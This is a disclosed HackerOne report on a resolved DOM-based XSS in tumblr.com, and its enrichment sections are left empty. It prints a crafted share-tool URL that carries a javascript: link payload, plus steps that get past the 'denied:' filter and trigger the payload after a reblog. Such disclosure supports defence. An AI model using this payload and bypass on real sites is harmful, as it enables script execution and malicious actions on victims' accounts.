---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '882546'
original_report_id: '882546'
title: DOM-Based XSS in tumblr.com
weakness: Cross-site Scripting (XSS) - DOM
team_handle: automattic
created_at: '2020-05-26T04:00:02.187Z'
disclosed_at: '2020-07-27T15:24:50.524Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 90
asset_identifier: www.tumblr.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM-Based XSS in tumblr.com

## Metadata

- HackerOne Report ID: 882546
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: automattic
- Disclosed At: 2020-07-27T15:24:50.524Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Description
Hi, i just found a XSS that i think it's a valid issue and i think it is in scope this time.

To get the XSS the attacker needs to create a post in tumblr.com using `https://www.tumblr.com/widgets/share/tool?url=https%3A%2F%2Fkeerok.github.io%2F&title=%3Ca%20href=%22javascript:alert(document.domain);//http://evil.com/%22%3Eclick%20me%3C/a%3E&selection=click%20in%20the%20link%20after%20reblog&shareSource=chrome_extension` URL and change the link of click me text to `javascript:alert(document.domain);//https://evil.com/` without the "denied:". 

After post the payload , the victim needs to reblog the post in www.tumblr.com and click in "click me" and  in "open" to open in a new tab the URL, after this, XSS will be triggered.

I also attached a video of the PoC:
{F842750}


# Steps to reproduce
1. go to `https://www.tumblr.com/widgets/share/tool?url=https%3A%2F%2Fkeerok.github.io%2F&title=%3Ca%20href=%22javascript:alert(document.domain);//http://evil.com/%22%3Eclick%20me%3C/a%3E&selection=click%20in%20the%20link%20after%20reblog&shareSource=chrome_extension`
2. remove "denied:" from click me link
3. save the post
4. victim reblog the post
5. click in "click me"
6. click in open (Abrir)
7. XSS will be triggered

## Impact

it is possible to perform malicious actions on the victim's account

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
